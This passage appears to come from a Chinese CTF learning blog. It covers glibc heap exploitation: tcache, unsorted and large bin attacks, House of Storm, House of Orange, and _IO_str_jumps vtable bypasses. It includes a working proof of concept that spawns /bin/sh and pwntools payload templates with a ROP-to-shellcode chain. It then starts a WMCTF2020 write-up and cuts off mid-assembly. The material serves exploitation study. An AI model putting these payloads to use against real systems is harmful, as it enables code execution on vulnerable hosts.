(mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\t//new\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\t//new\n  return (void *) e;\n}\n```\n\ntcache机制首先会在heap开头位置创建一个tcache_perthread_struct结构体来维护：\n\n```c\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40*8\n} tcache_perthread_struct;\n```\n\n其前0x40字节为对应大小tcache的数量，后0x200个字节为指针数组，指向tcache_entry链表的头部指针\n\n![image-20201223173939891](https://i.loli.net/2020/12/23/WYiPs2Mx9DzC1fk.png)\n\n当chunk被free到tcache中时，`key`会被置为`tcache_perthread_struct`的地址，也就是heap开头的位置。当chunk从tcache中取出来时，`key`会被设置成NULL。总而言之，就是通过`key`来表明这个chunk是否在tcache中。\n\n而这个`key`也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的`key`是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。\n\n若key为0或者修改chunk的大小，使chunk的size不在该tacache内，即可再次造成doublefree。\n\n这里记录另一种高版本tcache的利用，叫作Tcache Stashing Unlink Attack。glibc-2.29 samllbin范围内的申请流程：\n\n```c\nif (in_smallbin_range (nb))  \n    {  \n      idx = smallbin_index (nb);  \n      bin = bin_at (av, idx);  \n\n      if ((victim = last (bin)) != bin) //取该索引对应的small bin中最后一个chunk  \n        {  \n          bck = victim->bk;  //获取倒数第二个chunk  \n      if (__glibc_unlikely (bck->fd != victim)) //检查双向链表完整性  \n        malloc_printerr (\"malloc(): smallbin double linked list corrupted\");  \n          set_inuse_bit_at_offset (victim, nb);  \n          bin->bk = bck; //将victim从small bin的链表中卸下  \n          bck->fd = bin;  \n\n          if (av != &main_arena)  \n        set_non_main_arena (victim);  \n          check_malloced_chunk (av, victim, nb);  \n#if USE_TCACHE  \n      /* While we're here, if we see other chunks of the same size, \n         stash them in the tcache.  */  \n      size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引  \n      if (tcache && tc_idx < mp_.tcache_bins) //如果该索引在tcache bin范围  \n        {  \n          mchunkptr tc_victim;  \n\n          /* While bin not empty and tcache not full, copy chunks over.  */  \n          while (tcache->counts[tc_idx] < mp_.tcache_count  //当tcache bin不为空并且没满，并且small bin不为空，则依次取最后一个chunk插入到tcache bin里  \n             && (tc_victim = last (bin)) != bin)  \n        {  \n          if (tc_victim != 0)  \n            {  \n              bck = tc_victim->bk;  \n              set_inuse_bit_at_offset (tc_victim, nb);  \n              if (av != &main_arena)  \n            set_non_main_arena (tc_victim);  \n              bin->bk = bck; //将当前chunk从small bin里卸下  \n              bck->fd = bin;  \n              tcache_put (tc_victim, tc_idx);  //放入tcache bin里  \n                }  \n        }  \n        }  \n#endif  \n          void *p = chunk2mem (victim);  \n          alloc_perturb (p, bytes);  \n          return p;  \n        }  \n    }  \n```\n\n从small bin中取出最后一个chunk的时候，对双向链表做了完整性的检查，然而，后面将剩余chunk放入tcache bin的时候，却没有这个检查。因此只要修改smallbin中最后一个chunk的bk为target地址，那么通过完整性检查后，它就被放入tcache中，就可以将target申请出来进行利用。\n\n值得注意的一点是，需要使用到calloc()，可以绕过tcache，直接申请smallbin。因此该方法的利用条件为可以控制smallbin的bk，存在一条tcache bin（未满）和两个相同大小的smallbin存在的时候，通过calloc函数申请此大小的堆块触发将后一个smallbin中的堆块插入tcachebin链中。\n\nglibc2.32引入的新的防御机制-**safe-linking**(异或加密) [参考](http://blog.nsfocus.net/glibc-234/)，tcache链也从7个增到16个\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\n也就是说此时chunk的fd为 (&(p2->next)>>12) ^ &p1，自己的地址>>12 ^ fd\n\nglibc2.34之后取消了free_hook malloc_hook等\n\n### 8. unsorted bin attack\n\n双向循环链表，先进先出，以下几种情况会分到 unsorted bin 中\n\n> 1、当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中\n>\n> 2、释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中\n>\n> 3、当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话\n\nunsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\n\n利用方法，修改unsorted bin中chunk的bk为目标地址-0x10，再去将其申请出来时进行以下操作：\n\n```c\n/* remove from unsorted list */\n//bck = chunk->bk\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\n最终target地址-0x10的位置就被写入了unsortedbin的地址 (unsorted_chunks (av))\n\n### 9. large bin attack \n\n堆块管理器中最慢的一种管理方式，largebin 的范围是 size > 0x400（x64）\n\nlarge bin 采用双链表结构，里面的 chunk 从头结点的 fd 指针开始，按大小顺序进行排列。且不同的序号的largebin的差值不同(0x40\\*32,0x200\\*16,0x1000\\*8,0x8000*4,0x40000\\*2)\n\n其chunk结构：\n\n```c\nstruct malloc_chunk {\n  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */\n  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */\n  struct malloc_chunk* fd;         /* double links -- used only if free. */\n  struct malloc_chunk* bk;\n  /* Only used for large blocks: pointer to next larger size.  */\n  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\n  struct malloc_chunk* bk_nextsize;\n};// fd_nextsize 和 bk_nextsize 来链接到下一个 size 的堆块头部和上一个 size 的堆块头部，在相同 size 的堆块内部再通过 fd 和 bk 来进行内部的管理。类似横向和纵向链表\n```\n\n为了管理的高效，在纵向链表(fd_nextsize/bk_nextsize)中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连。\n\n遍历unsortedbin代码如下：\n\n```c\nif (in_smallbin_range(size)) \n{\n  victim_index = smallbin_index(size);//获取size对应的smallbin的index\n  bck = bin_at(av, victim_index);//bck指向size对应的smallbin的链表头\n  //fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)\n  fwd = bck->fd;\n}\nelse//如果不再smallbin的范围，也就是说在large bin 的范围\n{\n  victim_index = largebin_index(size);//获取size对应的large bin的index\n  bck = bin_at(av, victim_index);//bck指向size对应的large bin的链表头\n  fwd = bck->fd;//fwd指向size对应的large bin的链表中的新加入的chunk\n  \n  //如果large bin 非空，在largbin进行按顺序插入\n  if (fwd != bck) {\n      /* Or with inuse bit to speed comparisons */\n      size |= PREV_INUSE;\n      assert((bck->bk->size & NON_MAIN_ARENA) == 0);//默认不启用assert\n      /*\n        large bin中的chunk是按从大到小排列的，如果size < large bin \n        的最后一个chunk，说明size是这个large bin中的最小的，我们把它\n        加入到此large bin尾部。\n      */\n      if ((unsigned long) (size) < (unsigned long) (bck->bk->size)) {\n          \n          fwd = bck;\n          bck = bck->bk;\n          \n          /*\n          large bin 中size最小的chunk的fd_nextsize会指向size最大的\n          那个chunk，也就是首部的chunk。同样，large bin 中size最大的\n          chunk的bk_nextsize会指向size最小的那个chunk。\n          victim的bk_nextsize指向large bin原来最小的chunk，它的\n          bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。\n          把它fd_nextsize和bk_nextsize都修正。\n          */\n          victim->fd_nextsize = fwd->fd;\n          victim->bk_nextsize = fwd->fd->bk_nextsize;\n          //最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim\n          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n      } \n      else //如果victim不是large bin 中最小的chunk\n      {\n          assert((fwd->size & NON_MAIN_ARENA) == 0);//默认不启用assert\n          //从大到小（从头到尾）找到合适的位置\n          while ((unsigned long) size < fwd->size) {\n              fwd = fwd->fd_nextsize;\n              assert((fwd->size & NON_MAIN_ARENA) == 0);\n          }\n    //如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了\n          if ((unsigned long) size == (unsigned long) fwd->size)\n              fwd = fwd->fd;\n          else \n          {\n              //size不相等，即size>fwd->size，把victim加入到纵向链表中\n              victim->fd_nextsize = fwd;\n              victim->bk_nextsize = fwd->bk_nextsize;\n              fwd->bk_nextsize = victim;\n              victim->bk_nextsize->fd_nextsize = victim;\n          }\n          bck = fwd->bk;\n      }\n  } \n  else //如果large bin 为空，将victim加入到纵向列表\n    victim->fd_nextsize = victim->bk_nextsize = victim;\n}\n//#define mark_bin(m, i)    ((m)->binmap[idx2block (i)] |= idx2bit (i))\nmark_bin(av, victim_index); //把victim加入到的bin的表示为非空\n//把victim加入到large bin的链表中\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\n当已经存在一个largebin Y和unsortedbin X，那么再申请一个堆块就会触发unsortedbin脱链，让unsortedbin中chunk插入到largebin中，如果满足 size (X) > size (Y) && index (size (X)) == index (size (Y))，那么 X 就会插入到 Y 的前面，从而触发这一串代码进行插入。\n\n```c\n//victim是X、fwd是修改后的Y\n{\n    victim->fd_nextsize = fwd;//1\n    victim->bk_nextsize = fwd->bk_nextsize;//2\n    fwd->bk_nextsize = victim;//3\n    victim->bk_nextsize->fd_nextsize = victim;//4\n}\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\n把 2 带入 4 得到：`fwd->bk_nextsize->fd_nextsize=victim`\n同时下面有：`bck->fd = victim;`（bck 也就是 fwd->bk）也就是说之前我们伪造的Y的 bk->fd 跟 bk_nextsize 指向的地址被改为了 victim，即 tartget1 + 0x10与target2 + 0x20 被改为了 victim\n\n2.30以下存在一个利用方法叫作**House_of_storm**，`House_of_storm`是一种结合了`unsorted_bin_attack`和`Largebin_attack`的攻击技术,其基本原理和`Largebin_attack`类似，但是不同的是`Largebin_attack`只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而`House_of_storm`则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果。\n\n漏洞利用条件:\n1.需要攻击者在`largebin`和`unsorted_bin`中分别布置一个chunk 这两个chunk需要在归位之后处于同一个`largebin`的index中且`unsortedbin`中的chunk要比`largebin`中的大\n2.需要`unsorted_bin`中的`bk指针`可控\n3.需要`largebin`中的`bk指针和bk_nextsize`指针可控\n\n> 相较于`Largebin_attack`来说 攻击需要的条件多出了一条“unsorted_bin中的bk指针可控”，相当于unsortedbin attack + largebin attack \n\n1. unsorted_bin->bk = fake_chunk #把fake_chunk链到了unsorted_bin中\n2. fake_chunk+0x10 = unsorted_bin #伪造fake_chunk的fd\n3. fake_chunk+0x3 = unsorted_chunk #伪造fake_chunk的size\n4. fake_chunk+0x18 = unsorted_chunk #伪造fake_chunk的bk\n\n```c\n// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nstruct {\n    unsigned long  presize;\n    unsigned long  size;\n    unsigned long  fd;\n    unsigned long  bk;\n    unsigned long  fd_nextsize;\n    unsigned long  bk_nextsize;\n}chunk;\n\nint main()\n{\n    unsigned long *large_chunk,*unsorted_chunk;\n    unsigned long *fake_chunk = (unsigned long *)&chunk;\n    char *ptr;\n    \n    unsorted_chunk=malloc(0x418);\n    malloc(0X20);\n    large_chunk=malloc(0x408);\n    malloc(0x20);\n\n    free(large_chunk);\n    free(unsorted_chunk);\n    unsorted_chunk=malloc(0x418);  //large_chunk归位\n    free(unsorted_chunk);  // unsorted_chunk归位\n\n\t//重点一下3步\n    unsorted_chunk[1] = (unsigned long )fake_chunk;\n    large_chunk[1]    = (unsigned long )fake_chunk+8;\n    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;\n\n    ptr=malloc(0x48);\n    strncpy(ptr, \"/bin/sh\\x00\", 0x10);\n    system(((char *)fake_chunk + 0x10));\n    \n    return 0;\n}\n```\n\n所以当我们申请的size和`0x56`经过对齐后相等的话，那么就可以拿到任意的chunk。\n\n0x55 : `1010101`\n\n0x56 : `1010110`\n\n`__int_malloc`在拿到chunk后返回到`__libc_malloc`，`__libc_malloc`会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。\n\n利用 large bin attack 分别错位写一个 size 和 bk 的地址，size 错位写了 0x56（由于 pie 的原因，chunk 的地址总是为 6 字节，但是头部地址可能是 0x55 或者 0x56，这里需要 0x56 才能成功，因为 malloc 后会进行检测）\n\n以下检测需要满足的要求，只需满足一条即可\n\n```c\n/*\n\t#define arena_for_chunk(ptr) \\\n    \t(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &main_arena)\n    \n    过以下检测需要满足的要求，只需满足一条即可\n    1. victim 为 0\n    2. IS_MMAPPED 为 1\n    3. NON_MAIN_ARENA 为 0\n*/\nassert(!victim || chunk_is_mmapped(mem2chunk(victim)) \n       || ar_ptr == arena_for_chunk(mem2chunk(victim)));\n```\n\n利用 unsorted bin attack 在 fd 的位置写一个 main_arena + 88 的地址，从而绕过了检测。\n\n![image-20221115172747936](https://files.catbox.moe/s5ri0y.png)\n\n### 10. House of Orange\n\n总体流程：\n\n1. 题目中没有free，那么通过修改top chunk的size为一个小数，再申请一个大于该size的堆块，那么系统会调用sysmalloc通过brk拓展 top chunk，其中就会free掉old_top_chunk。\n2. 通过修改bk进行unsorted bin attack修改_IO_list_all为unsorted bin地址（main_arena+88）\n3. 同时在可控的unsorted bin里伪造0x60大小的IO_file_plus和 vtable 结构\n\n注：需要伪造0x60大小的字段，原因是unsorted bin attack之后_IO_list_all改为main_arena+88的地址，我们并不可控，而*chain域的偏移是0x68，main_arena+88+0x68刚好是small bin的0x60大小，将unsorted bin中的chunk的size修改为0x60且在old top chunk中布置伪造的IO_FILE，写入之后，再进行申请时，因为大小不合适unsorted bin chunk就会被链入smallbin的0x60数组中，即伪造的堆块被放入了IO_FILE结构体链表中，由于unsorted bin结构被破坏，所以在之后的检测发生了报错，这个报错就会调用到\\_IO\\_flush_all\\_lockp，而这里就会对\\_IO_list_all 进行遍历，调用 _IO_OVERFLOW (fp, EOF) getshell。\n\n```c\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n...\n /* place chunk in bin */\n\nif (in_smallbin_range (size))\n{\n   victim_index = smallbin_index (size);\n   bck = bin_at (av, victim_index);\n   fwd = bck->fd;\n}\n//先解链，再放入small bin\n```\n\n当glibc检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -> libc_message->__GI_abort ->  _IO_flush_all_lockp -> _IO_OVERFLOW，\\_IO_flush_all_lockp 会把 _IO_list_all作为链表头开始遍历，并把当前节点作为 _IO_OVERFLOW 的参数。\n\n![image-20221116225235056](https://files.catbox.moe/r1xrri.png)\n\n伪造 fp->\\_mode = 0， fp->\\_IO_write_ptr > fp->_IO_write_base来通过验证即可\n\n64位的_IO_FILE_plus构造模板：\n\n```python\nstream = \"/bin/sh\\x00\" + p64(0x61)\nstream += p64(0xDEADBEEF) + p64(IO_list_all-0x10)\nstream += p64(1) + p64(2) # fp->_IO_write_ptr > fp->_IO_write_base\nstream = stream.ljust(0xc0,\"\\x00\")\nstream += p64(0) # mode<=0\nstream += p64(0)\nstream += p64(0)\nstream += p64(vtable_addr)  # heap_base + 0x5E8当前位置\nstream += p64(0)*2  \nstream += p64(system_addr)  #_IO_OVERFLOW  \n```\n\n32位的_IO_FILE_plus构造模板：\n\n```python\nstream = \"sh\\x00\\x00\"+p32(0x31)   # system_call_parameter and link to small_bin[4] \nstream += \";$0\\x00\"+p32(IO_list_all-0x8)   # Unsorted_bin attack\nstream +=p32(1)+p32(2)     # fp->_IO_write_ptr > fp->_IO_write_base\nstream = stream.ljust(0x88,\"\\x00\")  \nstream += p32(0)    # mode<=0\nstream += p32(0)\nstream += p32(0)\nstream += p32(vtable_addr)  # vtable_addr --> system\n```\n\n64位下seccomp禁用execve系统调用的构造模板：\n\n```python\nio_list_all = libc_base+libc.symbols['_IO_list_all']\nsetcontext = libc_base+libc.symbols['setcontext']\nmprotect = libc_base+libc.symbols['mprotect']\nOpen = libc_base+libc.symbols['open']\nRead = libc_base+libc.symbols['read']\nWrite = libc_base+libc.symbols['write']\npop_rdi_ret = 0x0000000000400d93\npop_rsi_ret = libc_base+0x00000000000202e8\npop_rdx_ret = libc_base+0x0000000000001b92\npop_rdi_rbp_ret = libc_base+0x0000000000020256\npop_three_ret = 0x0000000000400d8f\nret = 0x00000000004008d9\n\ncontext.arch = 'amd64'\nshellcode = asm(shellcraft.amd64.linux.cat('flag'))\n\nrop = flat(\n    p64(pop_rdi_ret),\n    p64(current_io_chunk&~0xfff),\n    p64(pop_rsi_ret),\n    p64(0x1000),\n    p64(pop_rdx_ret),\n    p64(7),\n    p64(mprotect),\n)\nrop += p64(current_io_chunk+0x30+len(rop)+8)+shellcode\n\nfake_vtable = current_io_chunk+0xe0-0x18\n\npayload = p64(0) + p64(0x61)\npayload += p64(0xddaa) + p64(io_list_all-0x10)\npayload += p64(2) + p64(3)\npayload += rop\npayload = payload.ljust(0xa0,'\\x00')\npayload += p64(current_io_chunk+0x30) #rsp\npayload += p64(ret) # to rop\npayload = payload.ljust(0xd8,'\\x00')\npayload += p64(fake_vtable)\npayload += p64(setcontext+53) # 0xe0\n```\n\n将函数控制流控制在 setcontext+53 的位置，是因为这里正好可以修改 rsp 到我们的可控地址来进 行 rop，在切栈之后就可以按照如上过程执行 rop。 首先调用 mprotect 函数将 当前 heap 段设置为可执行，然后调用 cat flag 的 shellcode。\n\n**glibc2.24：**\n\n在\\_IO\\_OVERFLOW做了小小的改动，IO\\_validate\\_vtable增加了虚表范围的检查，也就是虚表地址必须位于`__start___libc_IO_vtables`和`__stop___libc_IO_vtables`之间，显然之前在堆中伪造的虚表不满足要求。\n\n![image-20221117144759735](https://files.catbox.moe/pf2bz8.png)\n\n**方法一：利用_IO_str_overflow**  \n\n虽然不能把vtable改到堆上了,但是我们依旧可以改 vtable为_IO_str_jump来绕过检测(\\_IO_str_jump这个虚表位于上面的范围之内)，因为其中使用的IO_str_overflow 函数会调用 FILE+0xe0处的地址。这时只要我们将虚表覆盖为\\_IO_str_jumps将偏移0xe0处设置为one_gadget即可。\n\n```c\n// libio/strops.c\nconst struct _IO_jump_t _IO_str_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_str_finish),\n  JUMP_INIT(overflow, _IO_str_overflow),\n  JUMP_INIT(underflow, _IO_str_underflow),\n  JUMP_INIT(uflow, _IO_default_uflow),\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n  JUMP_INIT(sync, _IO_default_sync),\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n  JUMP_INIT(read, _IO_default_read),\n  JUMP_INIT(write, _IO_default_write),\n  JUMP_INIT(seek, _IO_default_seek),\n  JUMP_INIT(close, _IO_default_close),\n  JUMP_INIT(stat, _IO_default_stat),\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n  JUMP_INIT(imbue, _IO_default_imbue)\n};\n```\n\n![image-20221117154004353](https://files.catbox.moe/y4z42z.png)\n\n需要满足的条件是：\n\n```c\n1.fp->_flags & _IO_NO_WRITES为假\n2.pos >= (_IO_size_t) (_IO_blen (fp) + flush_only为真\n3.fp->_flags & _IO_USER_BUF为假\n4._IO_size_t new_size = 2 * old_blen + 100 指向\"/bin/sh\"\n5.(*((_IO_strfile *) fp)->_s._allocate_buffer)指向system的地址\n/*\n2. flush_only = EOF = 0; _IO_blen (fp) = fp->_IO_buf_end - fp->_IO_buf_base; 所以第2条等于pos = fp->_IO_write_ptr - fp->_IO_write_base\n4. 结合第4条：new_size = 2 * old_blen + 100 = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100 = bin_sh_addr\n5. _s._allocate_buffer在fp中的偏移是0xe0，因此要设置：\n*/\nfp->_flags = 0 \nfp->_IO_buf_base = 0\nfp->_IO_buf_end = (bin_sh_addr - 100)/2\nfp->_IO_write_base = 0\nfp->_IO_write_ptr = (bin_sh_addr - 100)/2 或 fp->_IO_write_ptr = 0xffffffff 或根本不设置该值\nfp+0xe0 = system_addr\nfp->mode = 0\nvtable = _IO_str_jumps - 0x18\n```\n\n**方法二：利用_IO_str_finish**\n\n![image-20221117160607396](https://files.catbox.moe/1jxlfs.png)\n\n需要满足的条件是：\n\n```c\nfp->_IO_buf_base为真，(fp->_flags & _IO_USER_BUF)为假\nfp->_IO_buf_base为bin_sh_addr\nfp->_s._free_buffer为system函数地址\n    \nfp->_flags = 0\nfp->_IO_buf_base = bin_sh_addr\nfp->_s._free_buffer = system_addr\nvtable = _IO_str_jumps - 0x8\n```\n\n利用之前的House of Orange，将vtable改为_IO_str_jumps - 0x8，因为\\_IO_str_finish在\\_IO_str_jumps的偏移与在中偏移不同。\n\n![image-20221117163009870](https://files.catbox.moe/wy1ir1.png)\n\n由于 `_IO_str_jumps` 不是导出符号，因此无法直接利用 pwntools 进行定位，我们可以利用 `_IO_str_jumps`中的导出函数，例如 `_IO_str_underflow` 进行辅助定位，我们可以利用gdb去查找所有包含这个`_IO_str_underflow` 函数地址的内存地址，如下所示：\n\n![image-20221117172435419](https://files.catbox.moe/idkgzn.png)\n\n再利用 `_IO_str_jumps` 的地址大于 `_IO_file_jumps` 地址的条件，就可以锁定最后一个地址为符合条件的 `_IO_str_jumps` 的地址，由于 `_IO_str_underflow` 在`_IO_str_jumps` 的偏移为0x20，我们可以计算出`_IO_str_jumps` 的地址。\n\n```python\ndef get_IO_str_jumps():\n\tIO_file_jumps_offset = libc.sym['_IO_file_jumps']\n\tIO_str_underflow_offset = libc.sym['_IO_str_underflow']\n\tfor ref_offset in libc.search(p64(IO_str_underflow_offset)):\n\t\tpossible_IO_str_jumps_offset = ref_offset - 0x20\n\t\tif possible_IO_str_jumps_offset > IO_file_jumps_offset:                                     return possible_IO_str_jumps_offset\n```\n\n彩蛋：glibc2.29的虚表可写！\n\n![image-20221117170950250](https://files.catbox.moe/cu3dhr.png)\n\n------\n\n最后记录一下malloc_state结构和malloc和free的流程：\n\n```c\nmalloc_state就是内存中用来管理堆的数据结构，源码中表现形式如下\n\n/*保存堆状态的结构体malloc_state*/\nstruct malloc_state\n{\n  /* Serialize access.  */\n  /*该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。*/\n  __libc_lock_define (, mutex);\n\n  /* Flags (formerly in max_fast).  */\n  /*flags 记录了分配区的一些标志*/\n  int flags;\n\n  /* Set if the fastbin chunks contain recently inserted free blocks.  */\n  /* Note this is a bool but not all targets support atomics on booleans.  */\n  int have_fastchunks;/*是否存在fastbin*/\n\n  /* Fastbins （0x20~0x80）*/\n  mfastbinptr fastbinsY[NFASTBINS];/*记录fastbin*/\n\n  /* Base of the topmost chunk -- not otherwise kept in a bin */\n  mchunkptr top;/*记录top chunk*/\n\n  /* The remainder from the most recent split of a small request */\n  mchunkptr last_remainder;/*分割后剩余部分*/\n\n  /* Normal bins packed as described above */\n  /* unsorted_bin small_bin(0x20-0x400) large_bin(>0x400) */\n    mchunkptr bins[NBINS * 2 - 2];\n\n  /* Bitmap of bins */\n  unsigned int binmap[BINMAPSIZE];/*标识某个bin是否空的map */\n\n  /* Linked list */\n  struct malloc_state *next;/*与下一个malloc_state形成双链表*/\n\n  /* Linked list for free arenas.  Access to this field is serialized\n     by free_list_lock in arena.c.  */\n  struct malloc_state *next_free;\n\n  /* Number of threads attached to this arena.  0 if the arena is on\n     the free list.  Access to this field is serialized by\n     free_list_lock in arena.c.  */\n  INTERNAL_SIZE_T attached_threads;\n\n  /* Memory allocated from the system in this arena.  */\n  INTERNAL_SIZE_T system_mem;\n  INTERNAL_SIZE_T max_system_mem;\n};\n```\n\nptmalloc2共有127个bin。其中62个small bin，64个large bin以及一个unsorted bin。malloc_state的bins数组存放了所有的bins信息（除tcache）\n\n其中`bin[0]bin[1]`保存了unsorted bin链表的头指针.`bin[2]`和`bin[3]`合起来指示了一个bin双链表就是堆的第一个small bin，其中`bin[2]`是头指针，`bin[3]`是尾指针。\n\n**malloc：**\n\n1.如果size < max fast, 在fast bins中寻找fast chunk， 如找到则结束\n2.如果(if) size in_ smallbin_ range, 在small bins中寻找small chunk,如找到则结束\n3.如果(else) size not in_smallbin_ range， 合并所有fastbin的chunk\n4.循环\n—a.检查unsorted bin中的last_remainder(初始为0)\n\t\t如果满足一 定条件，则分裂之，将剩余的chunk标记为新的last remainder\n—b.在unsorted bin中搜索，同时进行整理\n\t\t如遇到精确大小， 则返回，否则就把当前chunk整理到small/large bin中去.\n—c.在small bin和large bin中搜索最合适的chunk (不一定是精确大小)\n5.使用top chunk\n\n> 通常这里会使用到unsorted bin分割的手法，即已有unsorted bin，再次申请一个小堆块，如果没有满足条件的堆块就进入4.循环，一般初始last_remainder为0，所以跳过步骤a，将此unsorted bin整理进入small bin(或large)，然后进行步骤c，将small bin分割并分配出来( 此时该堆块中残留smallbin的地址，可用于泄露libc )，剩下的则进入unsorted bin，标为last_remainder。再次分割unsorted bin时，此时last_remainder存在，则进行步骤a。\n\n**free:**\n\n1.如果size < max fast,放入fast bin,结束\n2.如果前一个chunk是free的\n—a. unlink前面的chunk\n—b.合并两个chunk(向后合并), 并放入unsorted bin\n3.如果后一个chunk是top chunk,则将当前chunk并入top chunk(向前合并)\n4.如果后一个chunk时free的\n—a. unlink后面的chunk\n—b. 合并两个chunk(向前合并),并放入unsorted bin\n5.前后chunk都不是free的,放入unsorted bin\n\n# 0x04 小结\n\n堆的利用灵活多变，且情况比栈的利用复杂的多，我所记录的只是一些最基本且常见的方法，便于对堆溢出漏洞利用有一个比较客观的认识，至于更多技巧，则需要自己不断实践和学习积累来获得。\n","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"WMCTF2020","url":"/2020/08/05/WMCTF/","content":"\n# 0x00 前言\n\n主要记录两道题**WMare**(re)和**mengyedekending**(pwn)\n\n# 0x01 WMare\n\n好一个虚拟机！这道题断断续续看了两天...首先感谢我[炜哥](https://ljzjsc.com/)的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿.... \n\n------\n\n## 0x02 [传送门](https://ljzjsc.com/index.php/archives/69/)\n\n炜哥博客里记录的很详细，从启动到手撕一气呵成/滑稽脸，我就不再赘述了。\n\n点击传送门直接开启新世界。\n\n------\n\n## 0x03 遇到的问题\n\n我只简单地记录一下我在调试时遇到的问题。\n\n从一开始找到`WELCOME TO WMCTF! INPUT:`以及输入函数都没太大问题，关键还是在于最后的校验函数。\n\n我先拷一下校验的汇编：\n\n```assembly\n0000000000006000: (                   ): jmp .+0 (0x00006002)      ; eb00\n0000000000006002: (                   ): xor ecx, ecx              ; 31c9\n0000000000006004: (                   ): cmp ecx, 0x00000081       ; 81f981000000\n000000000000600a: (                   ): jz .+226 (0x000060f2)     ; 0f84e2000000\n0000000000006010: (                   ): xor esi, esi              ; 31f6\n0000000000006012: (                   ): cmp esi, 0x00000009       ; 83fe09\n0000000000006015: (                   ): jz .+209 (0x000060ec)     ; 0f84d1000000\n000000000000601b: (                   ): xor edx, edx              ; 31d2\n000000000000601d: (                   ): mov eax, esi              ; 89f0\n000000000000601f: (                   ): inc eax                   ; 40\n0000000000006020: (                   ): mov ebx, 0x00000009       ; bb09000000\n0000000000006025: (                   ): div eax, ebx              ; f7f3\n0000000000006027: (                   ): mov edi, edx              ; 89d7\n0000000000006029: (                   ): xor edx, edx              ; 31d2\n000000000000602b: (                   ): mov eax, ecx              ; 89c8\n000000000000602d: (                   ): mov ebx, 0x00000003       ; bb03000000\n0000000000006032: (                   ): div eax, ebx              ; f7f3\n0000000000006034: (                   ): jz .+5 (0x0000603b)       ; 7405\n0000000000006036: (                   ): jnz .+3 (0x0000603b)      ; 7503\n0000000000006038: (                   ): ret 0x0099                ; c29900\n000000000000603b: (                   ): cmp edx, 0x00000000       ; 83fa00\n000000000000603e: (                   ): jz .+7 (0x00006047)       ; 7407\n0000000000006040: (                   ): cmp edx, 0x00000001       ; 83fa01\n0000000000006043: (                   ): jz .+56 (0x0000607d)      ; 7438\n0000000000006045: (                   ): jnz .+108 (0x000060b3)    ; 756c\n0000000000006047: (                   ): shl esi, 0x02             ; c1e602\n000000000000604a: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06\n000000000000604d: (                   ): shl edi, 0x02             ; c1e702\n0000000000006050: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f\n0000000000006053: (                   ): mov edx, eax              ; 89c2\n0000000000006055: (                   ): mov 